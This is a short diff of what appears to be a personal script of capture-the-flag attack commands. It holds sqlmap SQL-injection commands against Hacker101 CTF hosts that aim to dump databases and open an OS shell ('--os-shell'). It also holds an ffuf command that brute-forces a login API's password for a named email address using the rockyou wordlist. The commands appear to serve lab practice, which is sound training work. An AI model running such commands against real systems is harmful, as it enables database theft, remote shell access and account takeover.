@@ -16,7 +16,7 @@ done
 # done
 
 #sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10
-sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10
+sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/ --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
 
 ffuf -w /usr/share/wordlists/rockyou.txt:PASS -u http://94.237.58.173:57926/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
 
